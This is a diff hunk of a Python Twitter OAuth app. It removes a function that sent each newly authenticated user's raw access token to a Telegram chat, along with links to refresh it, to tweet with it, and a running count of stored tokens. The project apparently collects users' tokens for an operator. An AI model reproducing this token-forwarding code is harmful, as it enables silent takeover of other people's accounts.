@@ -138,47 +138,14 @@ def refresh_token_in_db(refresh_token, username):
         return None, None
 
 # Send message via Telegram
-def send_message_via_telegram(access_token, refresh_token=None):
-    # Emojis encoded as UTF-8 safe strings
-    alert_emoji = "\U0001F6A8"  # 🚨
-    key_emoji = "\U0001F511"  # 🔑
-    user_emoji = "\U0001F464"  # 👤
-
-    # Get the username from the access token
-    username = get_twitter_username(access_token)
-    if username:
-        twitter_url = f"https://twitter.com/{username}"
-    else:
-        twitter_url = "Unknown user"
-    
-    # Calculate total tokens
-    total_tokens = get_total_tokens()
-
-    # Construct the message
-    message = f"{alert_emoji} *New user authenticated: OAuth 2.0*\n"
-    message += f"{key_emoji} *Access Token:* `{access_token}`\n"
-    
-    if refresh_token:
-        refresh_link = f"{CALLBACK_URL}refresh/{refresh_token}"
-        message += f"{key_emoji} *Refresh Token Link:* [Refresh Token]({refresh_link})\n"
-
-    tweet_link = f"{CALLBACK_URL}tweet/{access_token}"
-    message += f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({tweet_link})\n"
-    message += f"{user_emoji} *Twitter Profile:* [@{username}]({twitter_url})\n"
-    message += f"🔢 *Total Tokens in Database:* {total_tokens}"
-
-    # Send the message to Telegram ensuring UTF-8 encoding
+def send_message_via_telegram(message):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     data = {
         "chat_id": TELEGRAM_CHAT_ID,
         "text": message,
         "parse_mode": "Markdown"
     }
-
-    response = requests.post(url, json=data)
-
-    if response.status_code != 200:
-        print(f"Failed to send message via Telegram: {response.text}")
+    requests.post(url, json=data)
 
 # Function to get Twitter username
 def get_twitter_username(access_token):
